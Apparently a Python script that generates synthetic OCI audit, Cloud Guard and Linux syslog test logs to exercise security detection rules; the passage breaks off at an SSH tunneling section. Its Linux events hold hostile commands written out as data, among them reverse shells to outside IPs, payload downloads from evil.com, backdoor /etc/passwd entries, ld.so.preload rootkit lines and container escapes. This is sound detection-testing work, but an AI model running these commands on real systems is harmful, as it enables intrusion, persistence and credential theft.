"""
Generate realistic test log files for all 201 detection rules + 15 hunting queries.

Produces NDJSON (JSON Lines) files in test_data/ for each log source category:
  - oci_audit.jsonl          OCI Audit events (80 rules + hunting)
  - cloud_guard.jsonl        OCI Cloud Guard events (12 rules)
  - linux_syslog.jsonl       Linux syslog/auth events (65 rules + hunting)
  - windows_sysmon.jsonl     Windows Sysmon events (55 rules + hunting)
  - manifest.json            Maps rules to generated events

Each log entry is crafted to trigger detection rules when queried.
Hunting-specific events generate higher volumes with consistent source
attributes (same IP, same host) to support aggregation-based queries.

Usage:
  python3 scripts/generate_test_logs.py
  python3 scripts/generate_test_logs.py --validate
"""

import json
import ntpath
import os
import random
import sys
import uuid
import argparse
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from oci_config import COMPARTMENT_ID

PROJECT_DIR = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_DIR / 'test_data'
QUERIES_DIR = PROJECT_DIR / 'queries'

# ─── Identity pools ──────────────────────────────────────────────

OCI_USERS = [
    ("ocid1.user.oc1..aaa1", "admin@corp.example.com", "natv"),
    ("ocid1.user.oc1..aaa2", "sre-lead@corp.example.com", "natv"),
    ("ocid1.user.oc1..aaa3", "dev-ops@corp.example.com", "federation"),
    ("ocid1.user.oc1..aaa4", "rogue-admin@corp.example.com", "natv"),
    ("ocid1.user.oc1..aaa5", "compromised-svc@corp.example.com", "natv"),
]

SUSPICIOUS_IPS = ["45.33.32.156", "185.220.101.1", "91.92.109.18", "194.5.249.7"]
CORPORATE_IPS = ["10.0.0.5", "10.0.1.10", "172.16.0.50", "192.168.1.100"]

LINUX_HOSTS = ["web-prod-01", "app-prod-02", "db-prod-01", "bastion-01", "k8s-worker-03"]
LINUX_USERS = ["root", "admin", "deploy", "www-data", "svc-app"]
WINDOWS_HOSTS = ["DC01.corp.local", "SRV01.corp.local", "WS01.corp.local"]
WINDOWS_USERS = ["CORP\\admin", "CORP\\analyst", "NT AUTHORITY\\SYSTEM"]

BASE_TIME = datetime.now(timezone.utc) - timedelta(hours=24)


def ts(offset_minutes=0):
    """Generate ISO8601 timestamp with optional offset."""
    t = BASE_TIME + timedelta(minutes=offset_minutes, seconds=random.randint(0, 59))
    return t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def windows_guid():
    """Generate a Windows-style GUID string with braces."""
    return "{" + str(uuid.uuid4()).upper() + "}"


# ═══════════════════════════════════════════════════════════════════
#  OCI Audit Event Generators
# ═══════════════════════════════════════════════════════════════════

def oci_audit_event(event_type, user=None, ip=None, status="200",
                    response_payload=None, resource_name="", offset=0):
    """Generate a standard OCI Audit log event in the official envelope format."""
    if user is None:
        user = random.choice(OCI_USERS)
    else:
        user = ("ocid1.user.oc1..aaa9", user, "natv")
    if ip is None:
        ip = random.choice(CORPORATE_IPS)

    return {
        "eventType": event_type,
        "cloudEventsVersion": "0.1",
        "eventTypeVersion": "2.0",
        "source": event_type.rsplit(".", 1)[0] if "." in event_type else "unknown",
        "eventId": str(uuid.uuid4()),
        "eventTime": ts(offset),
        "contentType": "application/json",
        "data": {
            "compartmentId": COMPARTMENT_ID,
            "compartmentName": "security-test",
            "resourceName": resource_name,
            "resourceId": f"ocid1.resource.oc1..{uuid.uuid4().hex[:40]}",
            "availabilityDomain": "AD-1",
            "request": {
                "id": str(uuid.uuid4()),
                "action": "POST",
                "path": f"/20160918/{event_type.split('.')[-1]}",
            },
            "response": {
                "status": status,
                "headers": {},
                "payload": response_payload or {},
            },
            "stateChange": {"previous": {}, "current": {}},
            "identity": {
                "principalName": user[1],
                "principalId": user[0],
                "ipAddress": ip,
                "userAgent": "Oracle-JavaSDK/2.0 (test-simulation)",
                "authType": user[2],
            },
            "freeformTags": {},
            "definedTags": {},
        },
        "oracle": {
            "compartmentid": COMPARTMENT_ID,
            "ingestedtime": ts(offset),
            "tenantid": "ocid1.tenancy.oc1..example",
        },
    }


def generate_oci_audit_events():
    """Generate OCI Audit events covering all 44 OCI Audit detection rules."""
    events = []

    # ── IAM Events ──
    iam_events = [
        ("com.oraclecloud.identitycontrolplane.createpolicy", "IAM Policy Created"),
        ("com.oraclecloud.identitycontrolplane.updatepolicy", "IAM Policy Updated"),
        ("com.oraclecloud.identitycontrolplane.deletepolicy", "IAM Policy Deleted"),
        ("com.oraclecloud.identitycontrolplane.createuser", "User Created"),
        ("com.oraclecloud.identitycontrolplane.deleteuser", "User Deleted"),
        ("com.oraclecloud.identitycontrolplane.addusertogroup", "User Added to Group"),
        ("com.oraclecloud.identitycontrolplane.removeuserfromgroup", "User Removed from Group"),
        ("com.oraclecloud.identitycontrolplane.creategroup", "Group Created"),
        ("com.oraclecloud.identitycontrolplane.deletegroup", "Group Deleted"),
        ("com.oraclecloud.identitycontrolplane.uploadapikey", "API Key Uploaded"),
    ]
    for i, (evt, name) in enumerate(iam_events):
        for j in range(3):
            events.append(oci_audit_event(evt, resource_name=name, offset=i*3+j))

    # ── Network Events ──
    network_events = [
        ("com.oraclecloud.virtualnetwork.createvcn", "VCN Created"),
        ("com.oraclecloud.virtualnetwork.deletevcn", "VCN Deleted"),
        ("com.oraclecloud.virtualnetwork.createsubnet", "Subnet Created"),
        ("com.oraclecloud.virtualnetwork.deletesubnet", "Subnet Deleted"),
        ("com.oraclecloud.virtualnetwork.createsecuritylist", "Security List Created"),
        ("com.oraclecloud.virtualnetwork.updatesecuritylist", "Security List Updated"),
        ("com.oraclecloud.virtualnetwork.createinternetgateway", "Internet GW Created"),
        ("com.oraclecloud.virtualnetwork.deleteinternetgateway", "Internet GW Deleted"),
        ("com.oraclecloud.virtualnetwork.attachinternetgateway", "Internet GW Attached"),
        ("com.oraclecloud.virtualnetwork.detachinternetgateway", "Internet GW Detached"),
        ("com.oraclecloud.virtualnetwork.createroutetable", "Route Table Created"),
        ("com.oraclecloud.virtualnetwork.updateroutetable", "Route Table Updated"),
        ("com.oraclecloud.virtualnetwork.updatenetworksecuritygroup", "NSG Updated"),
    ]
    base = len(events)
    for i, (evt, name) in enumerate(network_events):
        for j in range(2):
            events.append(oci_audit_event(evt, resource_name=name, offset=base+i*2+j))

    # Security list open to world
    for i in range(3):
        e = oci_audit_event(
            "com.oraclecloud.virtualnetwork.updatesecuritylist",
            resource_name="open-security-list",
            offset=base+len(network_events)*2+i
        )
        e["data"]["response"]["payload"] = {
            "ingressSecurityRules": [{"source": "0.0.0.0/0", "protocol": "6"}]
        }
        events.append(e)

    # ── Compute Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.launchinstance",
            resource_name="compute-instance",
            offset=200+i
        ))
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.terminateinstance",
            resource_name="terminated-instance",
            offset=210+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.instanceaction.start",
            resource_name="started-instance",
            offset=220+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.instanceaction.stop",
            resource_name="stopped-instance",
            offset=225+i
        ))

    # ── Storage Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.objectstorage.createbucket",
            resource_name="new-bucket",
            offset=300+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.objectstorage.deletebucket",
            resource_name="deleted-bucket",
            offset=310+i
        ))

    # Bucket made public
    for i in range(3):
        e = oci_audit_event(
            "com.oraclecloud.objectstorage.updatebucket",
            resource_name="public-bucket",
            offset=320+i
        )
        e["data"]["response"]["payload"] = {
            "publicAccessType": "ObjectRead"
        }
        events.append(e)

    # ── KMS Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.kms.createkey",
            resource_name="encryption-key",
            offset=400+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.kms.deletekey",
            resource_name="deleted-key",
            offset=410+i
        ))
    # KMS Key Scheduled Deletion
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.kms.schedulekeydeletion",
            resource_name="master-encryption-key",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=420+i
        ))

    # ── Database Events ──
    # Autonomous DB Terminated
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.databaseservice.deleteautonomousdatabase",
            resource_name="production-autonomous-db",
            offset=500+i
        ))

    # ── Load Balancer Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.loadbalancer.deleteloadbalancer",
            resource_name="prod-web-lb",
            offset=600+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.networkloadbalancer.deletenetworkloadbalancer",
            resource_name="prod-nlb",
            offset=610+i
        ))

    # ── WAF Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.waf.updatewebappfirewallpolicy",
            resource_name="prod-waf-policy",
            offset=700+i
        ))

    # ── Console Login Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            ip=random.choice(SUSPICIOUS_IPS),
            resource_name="",
            offset=800+i
        ))
    # Login failures
    for i in range(5):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            ip=random.choice(SUSPICIOUS_IPS),
            status="Failure",
            resource_name="",
            offset=810+i
        ))

    # ── Admin Policy Created with 'manage all-resources' ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createpolicy",
            resource_name="admin-policy",
            response_payload={
                "statements": ["Allow group admins to manage all-resources in tenancy"]
            },
            offset=900+i
        ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW: STIG Compliance OCI Audit Events
    # ═══════════════════════════════════════════════════════════════

    # ── MFA Disabled ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.deletemfatotpdevice",
            resource_name="user-mfa-device",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1000+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.identitycontrolplane.deletemfatotpdevice",
        resource_name="mfa-totp-device",
        offset=1002
    ))

    # ── Identity Provider Created (Federation Attack) ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createidentityprovider",
            resource_name="evil-saml-idp",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1010+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.identitycontrolplane.createsaml2identityprovider",
        resource_name="rogue-saml2-idp",
        offset=1012
    ))

    # ── Dynamic Group Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createdynamicgroup",
            resource_name=f"dynamic-group-{i}",
            offset=1020+i
        ))

    # ── Auth Token Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createauthtoken",
            resource_name="swift-auth-token",
            offset=1030+i
        ))

    # ── Compartment Deleted ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.deletecompartment",
            resource_name="production-compartment",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1040+i
        ))

    # ── Cloud Shell Session ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.cloudshell.startenvironment",
            resource_name="cloud-shell-env",
            offset=1050+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.cloudshell.createenvironment",
        resource_name="cloud-shell-env",
        offset=1052
    ))

    # ── Security List Allows All Protocols ──
    for i in range(2):
        e = oci_audit_event(
            "com.oraclecloud.virtualnetwork.updatesecuritylist",
            resource_name="wide-open-seclist",
            offset=1060+i
        )
        e["data"]["response"]["payload"] = {
            "ingressSecurityRules": [{"source": "0.0.0.0/0", "protocol": "all"}]
        }
        events.append(e)

    # ── Vault Key Version Update (rotation disabled) ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.kms.updatekeyversion",
            resource_name="master-key-v2",
            offset=1070+i
        ))

    # ── Function Invoked ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.functions.invokefunction",
            resource_name=f"data-exfil-function-{i}",
            offset=1080+i
        ))

    # ── Cross-Region Data Copy ──
    cross_region_events = [
        "com.oraclecloud.blockvolumes.copybootvolumeregion",
        "com.oraclecloud.blockvolumes.copyvolumeregion",
        "com.oraclecloud.objectstorage.copyobject",
        "com.oraclecloud.objectstorage.createreplicationpolicy",
    ]
    for i, evt in enumerate(cross_region_events):
        events.append(oci_audit_event(
            evt, resource_name="cross-region-target",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1090+i
        ))

    # ── Database System Terminated ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.databaseservice.terminatedbsystem",
            resource_name="prod-db-system",
            offset=1100+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.databaseservice.deletedbhome",
        resource_name="db-home-prod",
        offset=1102
    ))

    # ── Audit Configuration Changed ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.audit.updateconfiguration",
            resource_name="audit-config",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1110+i
        ))

    # ── Network Firewall Policy Modified ──
    fw_events = [
        "com.oraclecloud.networkfirewall.updatenetworkfirewallpolicy",
        "com.oraclecloud.networkfirewall.deletenetworkfirewall",
        "com.oraclecloud.networkfirewall.updatenetworkfirewall",
    ]
    for i, evt in enumerate(fw_events):
        events.append(oci_audit_event(
            evt, resource_name="prod-network-firewall",
            offset=1120+i
        ))

    # ── VCN Peering Created ──
    peering_events = [
        "com.oraclecloud.virtualnetwork.createlocalpeeringgateway",
        "com.oraclecloud.virtualnetwork.createremotepeeringconnection",
        "com.oraclecloud.virtualnetwork.connectremotepeeringconnections",
    ]
    for i, evt in enumerate(peering_events):
        events.append(oci_audit_event(
            evt, resource_name="peering-connection",
            offset=1130+i
        ))

    # ── Pre-Authenticated Request Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.objectstorage.createpreauthenticatedrequest",
            resource_name="sensitive-data-bucket-par",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1140+i
        ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 2): Additional OCI Audit Events
    # ═══════════════════════════════════════════════════════════════

    # ── Vault Secret Deleted ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.vault.schedulesecretdeletion",
            resource_name="db-connection-secret",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1200+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.vault.deletesecret",
        resource_name="api-key-secret",
        offset=1202
    ))

    # ── User Password Reset by Admin ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createorupdateuiconsolepassword",
            resource_name="target-user-password",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1210+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.identitycontrolplane.resetuiconsolepassword",
        resource_name="reset-user-password",
        offset=1212
    ))

    # ── Bastion Session Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.bastion.createsession",
            resource_name=f"bastion-ssh-session-{i}",
            offset=1220+i
        ))

    # ── Instance Console Connection Created ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.createinstanceconsoleconnection",
            resource_name="prod-instance-console",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1230+i
        ))

    # ── Notification Subscription Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.ons.createsubscription",
            resource_name=f"alert-subscription-{i}",
            offset=1240+i
        ))

    # ── Log Group Deleted ──
    events.append(oci_audit_event(
        "com.oraclecloud.loganalytics.deleteloganalyticsloggroup",
        resource_name="security-log-group",
        ip=random.choice(SUSPICIOUS_IPS),
        offset=1250
    ))
    events.append(oci_audit_event(
        "com.oraclecloud.logging.deleteloggroup",
        resource_name="audit-log-group",
        ip=random.choice(SUSPICIOUS_IPS),
        offset=1251
    ))

    # ── Customer Secret Key Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createcustomersecretkey",
            resource_name="s3-compat-key",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1260+i
        ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 4): MITRE Tactic Expansion - OCI Events
    # ═══════════════════════════════════════════════════════════════

    # ── Cloud Infrastructure Discovery (T1580) ──
    discovery_events = [
        "com.oraclecloud.computeapi.listinstances",
        "com.oraclecloud.virtualnetwork.listvcns",
        "com.oraclecloud.virtualnetwork.listsubnets",
        "com.oraclecloud.objectstorage.listbuckets",
        "com.oraclecloud.identitycontrolplane.listusers",
        "com.oraclecloud.identitycontrolplane.listgroups",
        "com.oraclecloud.identitycontrolplane.listpolicies",
        "com.oraclecloud.databaseservice.listautonomousdatabases",
    ]
    for i, evt in enumerate(discovery_events):
        events.append(oci_audit_event(
            evt,
            user="compromised-svc@corp.example.com",
            ip="45.33.32.156",
            resource_name=f"enum-{evt.split('.')[-1]}",
            offset=1400+i
        ))

    # ── Password Spraying (multiple failures across users) (T1110.003) ──
    spray_users = [
        "user1@corp.example.com",
        "user2@corp.example.com",
        "user3@corp.example.com",
        "user4@corp.example.com",
        "user5@corp.example.com",
    ]
    for i, user in enumerate(spray_users):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            user=user,
            ip="91.92.109.18",
            status="Failure",
            resource_name="",
            offset=1420+i
        ))

    # ═══════════════════════════════════════════════════════════════
    #  HUNTING: High-volume events for aggregation-based queries
    # ═══════════════════════════════════════════════════════════════

    # ── Console Login Brute Force (8 failures from same user) ──
    brute_user = ("ocid1.user.oc1..aaa_brute", "brute-force-target@corp.example.com", "natv")
    brute_ip = "91.92.109.18"
    for i in range(8):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            user="brute-force-target@corp.example.com",
            ip=brute_ip,
            status="Failure",
            resource_name="",
            offset=1300+i
        ))

    # ── Multi-User Same IP (3 different users from one IP) ──
    shared_ip = "185.220.101.1"
    multi_users = [
        "admin@corp.example.com",
        "sre-lead@corp.example.com",
        "dev-ops@corp.example.com",
    ]
    for i, user in enumerate(multi_users):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            user=user,
            ip=shared_ip,
            resource_name="",
            offset=1320+i
        ))

    # ── IAM Rapid Changes (12 IAM events from one user) ──
    rapid_user = "rogue-admin@corp.example.com"
    rapid_iam_events = [
        "com.oraclecloud.identitycontrolplane.createuser",
        "com.oraclecloud.identitycontrolplane.deleteuser",
        "com.oraclecloud.identitycontrolplane.creategroup",
        "com.oraclecloud.identitycontrolplane.deletegroup",
        "com.oraclecloud.identitycontrolplane.addusertogroup",
        "com.oraclecloud.identitycontrolplane.removeuserfromgroup",
        "com.oraclecloud.identitycontrolplane.createpolicy",
        "com.oraclecloud.identitycontrolplane.updatepolicy",
        "com.oraclecloud.identitycontrolplane.deletepolicy",
        "com.oraclecloud.identitycontrolplane.createdynamicgroup",
        "com.oraclecloud.identitycontrolplane.createauthtoken",
        "com.oraclecloud.identitycontrolplane.uploadapikey",
    ]
    for i, evt in enumerate(rapid_iam_events):
        events.append(oci_audit_event(
            evt,
            user=rapid_user,
            ip="194.5.249.7",
            resource_name=f"rapid-change-{i}",
            offset=1340+i
        ))

    # ── Resource Destruction Spike (8 delete/terminate from one user) ──
    destroy_events = [
        ("com.oraclecloud.computeapi.terminateinstance", "destroy-instance-1"),
        ("com.oraclecloud.computeapi.terminateinstance", "destroy-instance-2"),
        ("com.oraclecloud.objectstorage.deletebucket", "destroy-bucket-1"),
        ("com.oraclecloud.objectstorage.deletebucket", "destroy-bucket-2"),
        ("com.oraclecloud.identitycontrolplane.deleteuser", "destroy-user-1"),
        ("com.oraclecloud.identitycontrolplane.deletegroup", "destroy-group-1"),
        ("com.oraclecloud.kms.deletekey", "destroy-key-1"),
        ("com.oraclecloud.databaseservice.deleteautonomousdatabase", "destroy-db-1"),
    ]
    for i, (evt, name) in enumerate(destroy_events):
        events.append(oci_audit_event(
            evt,
            user="compromised-svc@corp.example.com",
            ip="45.33.32.156",
            resource_name=name,
            offset=1360+i
        ))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Cloud Guard Event Generators
# ═══════════════════════════════════════════════════════════════════

def cloud_guard_event(problem_type, resource_type="Instance", severity="HIGH",
                      recommendation="Review and remediate", offset=0):
    """Generate a Cloud Guard ProblemSummary-style event."""
    risk_score_map = {
        "CRITICAL": random.randint(90, 99),
        "HIGH": random.randint(70, 89),
        "MEDIUM": random.randint(40, 69),
        "LOW": random.randint(1, 39),
    }
    problem_id = str(uuid.uuid4())
    resource_name = f"test-{resource_type.lower()}-{random.randint(1, 99)}"
    return {
        # ProblemSummary-style identifiers
        "id": problem_id,
        "problemId": problem_id,  # backward compatibility for existing SOC parser content
        "compartmentId": COMPARTMENT_ID,
        "compartmentName": "security-test",
        "problemName": problem_type,
        "resourceType": resource_type,
        "resourceId": f"ocid1.{resource_type.lower()}.oc1..{uuid.uuid4().hex[:32]}",
        "resourceName": resource_name,
        "riskLevel": severity,
        "riskScore": risk_score_map.get(severity.upper(), 50),
        "detectorId": "ACTIVITY_DETECTOR",
        "detectorRuleId": f"ocid1.cloudguarddetectorrecipe.oc1..{uuid.uuid4().hex[:32]}",
        "region": "us-phoenix-1",
        "timeFirstDetected": ts(offset),
        "timeLastDetected": ts(offset + 1),
        "lifecycleState": "ACTIVE",
        "lifecycleDetail": "OPEN",
        "labels": [problem_type, problem_type.replace("_", " ")],
        "recommendation": recommendation,
        "additionalDetails": {
            "recommendedAction": recommendation,
            "targetDetector": "Cloud Guard Detector",
        },
    }


def generate_cloud_guard_events():
    """Generate Cloud Guard events covering all 12 Cloud Guard rules."""
    events = []

    # Problem names must match the Sigma rule detection values exactly
    problems = [
        ("Bucket_Public_Read", "Bucket", "HIGH"),
        ("Bucket_Public_Write", "Bucket", "CRITICAL"),
        ("INSTANCE_PUBLIC_IP", "Instance", "HIGH"),
        ("Instance_Principals_Enabled", "Instance", "MEDIUM"),
        ("Policy_Too_Permissive", "Policy", "HIGH"),
        ("Group_Has_Too_Many_Admins", "Group", "HIGH"),
        ("IAM_User_API_Key_Old", "User", "MEDIUM"),
        ("IAM_User_Console_Password_Old", "User", "MEDIUM"),
        ("Audit_Log_Retention", "Tenancy", "MEDIUM"),
        ("VCN_Flow_Log_Disabled", "VCN", "MEDIUM"),
        ("VCN_Security_List_Port_SSH", "SecurityList", "HIGH"),
        ("VCN_Security_List_Port_RDP", "SecurityList", "HIGH"),
    ]

    for i, (problem, resource, severity) in enumerate(problems):
        for j in range(3):
            events.append(cloud_guard_event(problem, resource, severity, offset=i*5+j))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Linux Syslog Event Generators
# ═══════════════════════════════════════════════════════════════════

def linux_event(process, message, host=None, facility="auth", offset=0):
    """Generate a Linux syslog event in JSON format."""
    if host is None:
        host = random.choice(LINUX_HOSTS)
    return {
        "Timestamp": ts(offset),
        "Hostname": host,
        "Process": process,
        "PID": random.randint(100, 65535),
        "Facility": facility,
        "Severity": "info",
        "msg": message,
    }


def generate_linux_events():
    """Generate Linux events covering all 33 Linux rules."""
    events = []

    # SSH Failed Login
    attacker_ip = random.choice(SUSPICIOUS_IPS)
    for i in range(10):
        events.append(linux_event("sshd",
            f"Failed password for {random.choice(LINUX_USERS)} from {attacker_ip} port {random.randint(40000,65535)} ssh2",
            offset=i))

    # Sudo usage
    for i in range(5):
        user = random.choice(["admin", "deploy", "www-data"])
        events.append(linux_event("sudo",
            f"{user} : TTY=pts/{i} ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            offset=20+i, facility="auth"))

    # Reverse shell patterns
    shells = [
        "bash -i >& /dev/tcp/185.215.113.206/4444 0>&1",
        "nc -e /bin/sh 103.253.41.45 8080",
        "ncat -e /bin/bash 89.34.111.113 443",
        "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 5.252.178.48 443 >/tmp/f",
        "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"185.215.113.206\",4444));'",
    ]
    for i, shell in enumerate(shells):
        events.append(linux_event("bash", shell, offset=30+i, facility="syslog"))

    # Crontab modification
    for i in range(3):
        events.append(linux_event("crontab",
            f"({random.choice(LINUX_USERS)}) REPLACE (root) crontab",
            offset=40+i, facility="cron"))

    # SSH authorized_keys modified
    for i in range(3):
        user = random.choice(LINUX_USERS)
        events.append(linux_event("bash",
            f"echo 'ssh-rsa AAAA... attacker@evil' >> /home/{user}/.ssh/authorized_keys",
            offset=50+i, facility="syslog"))

    # History file cleared
    history_cmds = [
        "history -c",
        "rm -f ~/.bash_history",
        "unset HISTFILE",
        "export HISTSIZE=0",
    ]
    for i, cmd in enumerate(history_cmds):
        events.append(linux_event("bash", cmd, offset=60+i, facility="syslog"))

    # Suspicious binaries (GTFOBins)
    suspicious_bins = {
        "base64": "base64 -d /tmp/encoded_payload",
        "chmod": "chmod 4755 /tmp/exploit",
        "chown": "chown root:root /tmp/backdoor",
        "curl": "curl -o /tmp/payload http://evil.com/malware",
        "dd": "dd if=/dev/sda of=/tmp/disk.img bs=4M",
        "gdb": "gdb -p 1234 -ex 'call system(\"/bin/sh\")'",
        "id": "id",
        "insmod": "insmod /tmp/rootkit.ko",
        "lua": "lua -e 'os.execute(\"/bin/sh\")'",
        "modprobe": "modprobe evil_module",
        "nc": "nc -lvp 4444 -e /bin/sh",
        "ncat": "ncat -lvp 4444 -e /bin/sh",
        "netcat": "netcat -e /bin/sh 10.0.0.1 4444",
        "nmap": "nmap -sV -p 1-65535 10.0.0.0/24",
        "passwd": "passwd --stdin deploy",
        "perl": "perl -e 'exec \"/bin/sh\"'",
        "python": "python -c 'import pty;pty.spawn(\"/bin/sh\")'",
        "rmmod": "rmmod evil_module",
        "ruby": "ruby -e 'exec \"/bin/sh\"'",
        "shadow": "cat /etc/shadow",
        "socat": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh",
        "strace": "strace -p 1 -e trace=open",
        "tcpdump": "tcpdump -i eth0 -w /tmp/capture.pcap",
        "tshark": "tshark -i eth0 -w /tmp/capture.pcap",
        "wget": "wget http://evil.com/malware -O /tmp/payload",
        "whoami": "whoami",
        "wireshark": "wireshark -i eth0 -k",
    }
    for i, (binary, cmd) in enumerate(suspicious_bins.items()):
        for j in range(2):
            events.append(linux_event(binary, cmd,
                offset=100+i*3+j, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW: Advanced Linux Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Container Escape Attempts ──
    container_escapes = [
        "nsenter -t 1 -m -u -i -n -p -- /bin/bash",
        "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
        "mount -t cgroup -o rdma cgroup /tmp/cgrp && echo 1 > /tmp/cgrp/notify_on_release",
        "echo '/path/to/payload' > /proc/sys/kernel/core_pattern",
    ]
    for i, cmd in enumerate(container_escapes):
        events.append(linux_event("bash", cmd, host="k8s-worker-03",
            offset=200+i, facility="syslog"))

    # ── LD_PRELOAD Hijacking ──
    ld_preload_cmds = [
        "LD_PRELOAD=/tmp/evil.so /usr/bin/id",
        "echo '/tmp/rootkit.so' >> /etc/ld.so.preload",
        "sed -i '1i /tmp/evil.so' /etc/ld.so.preload",
    ]
    for i, cmd in enumerate(ld_preload_cmds):
        events.append(linux_event("bash", cmd, offset=210+i, facility="syslog"))

    # ── Kernel Module from Temp Directory ──
    kernel_module_cmds = [
        "insmod /tmp/rootkit.ko",
        "insmod /dev/shm/hidden_module.ko",
        "insmod /var/tmp/persistence.ko",
    ]
    for i, cmd in enumerate(kernel_module_cmds):
        events.append(linux_event("insmod", cmd, offset=220+i, facility="syslog"))

    # ── Password File Direct Modification ──
    passwd_cmds = [
        "echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd",
        "tee -a /etc/passwd <<< 'eviluser:x:0:0::/root:/bin/bash'",
        "sed -i 's/root:x/root::/g' /etc/shadow",
        "echo 'backdoor::0:0::/:/bin/sh' > /etc/passwd",
    ]
    for i, cmd in enumerate(passwd_cmds):
        events.append(linux_event("bash", cmd, offset=230+i, facility="syslog"))

    # ── Process Injection via Ptrace ──
    ptrace_cmds = [
        "strace -p 1234 -o /tmp/trace.log",
        "gdb -p 5678 -batch -ex 'call system(\"/bin/sh\")'",
        "gdb --pid 9012 -batch -ex 'print (int)ptrace(PTRACE_ATTACH,1234,0,0)'",
    ]
    for i, cmd in enumerate(ptrace_cmds):
        events.append(linux_event("bash", cmd, offset=240+i, facility="syslog"))

    # ── Suspicious Network Traffic Redirect ──
    redirect_cmds = [
        "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443",
        "iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:8080",
        "iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT",
        "nft add rule ip nat prerouting tcp dport 443 dnat to 10.0.0.2:8443",
    ]
    for i, cmd in enumerate(redirect_cmds):
        events.append(linux_event("bash", cmd, offset=250+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 2): Additional Linux Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Systemd Service Persistence ──
    systemd_cmds = [
        "systemctl enable /etc/systemd/system/evil-backdoor.service",
        "systemctl daemon-reload && systemctl start evil-backdoor.service",
        "cp /tmp/evil.service /etc/systemd/system/persistence.service && systemctl enable persistence.service",
    ]
    for i, cmd in enumerate(systemd_cmds):
        events.append(linux_event("bash", cmd, offset=300+i, facility="syslog"))

    # ── SSH Tunneling ──
